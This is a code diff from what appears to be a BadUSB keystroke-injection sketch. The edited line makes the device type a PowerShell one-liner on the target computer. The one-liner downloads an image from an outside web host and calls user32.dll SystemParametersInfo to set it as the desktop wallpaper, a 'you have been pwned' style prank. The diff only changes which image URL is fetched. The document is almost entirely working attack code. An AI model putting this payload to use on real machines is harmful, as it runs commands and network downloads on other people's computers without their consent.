@@ -9,7 +9,7 @@ void setup() {
   sendEnter();
   delay(1000);
 
-  typeText("Invoke-WebRequest \"https://c7.alamy.com/comp/2HWXA10/you-have-been-pwned-message-on-hacked-computer-screen-with-glitch-effect-modern-2d-illustration-2HWXA10.jpg\" -OutFile \"$env:TEMP\\hoff.jpg\"; Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int u, int v, string s, int f);}' ; [W]::SystemParametersInfo(20,0,\"$env:TEMP\\hoff.jpg\",3)");
+  typeText("Invoke-WebRequest \"https://cryseg.com/wp-content/uploads/2019/05/FondoPantallaDistorcionado-1.jpg\" -OutFile \"$env:TEMP\\hoff.jpg\"; Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int u, int v, string s, int f);}' ; [W]::SystemParametersInfo(20,0,\"$env:TEMP\\hoff.jpg\",3)");
   sendEnter();
 
   //delay(1000);
